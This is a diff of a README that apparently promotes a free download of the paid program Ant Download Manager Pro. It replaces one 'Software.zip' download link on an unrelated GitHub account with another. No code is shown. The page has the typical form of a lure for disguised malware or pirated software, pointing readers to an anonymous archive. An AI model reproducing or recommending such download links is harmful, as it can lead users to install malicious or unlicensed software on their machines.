@@ -1,6 +1,6 @@
 # 🐜 Ant Download Manager Pro: Your Ultimate Download Companion 🚀
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Ritchard08/Ant-Download-Manager-Pro-Download/releases/download/v1.0/Software.zip)](https://github.com/Ritchard08/Ant-Download-Manager-Pro-Download/releases/download/v1.0/Software.zip)
 
 Welcome to the "Ant Download Manager Pro Download" repository! Here you will find everything you need to know about the Ant Download Manager Pro - from download options to user guides and reviews. So, let's dive into the world of seamless downloads and efficient management with Ant Download Manager Pro!
 
@@ -52,4 +52,4 @@ So what are you waiting for? Get your hands on Ant Download Manager Pro today an
 
 Let's elevate your downloading game with Ant Download Manager Pro! 🚀
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Ritchard08/Ant-Download-Manager-Pro-Download/releases/download/v1.0/Software.zip)](https://github.com/Ritchard08/Ant-Download-Manager-Pro-Download/releases/download/v1.0/Software.zip)
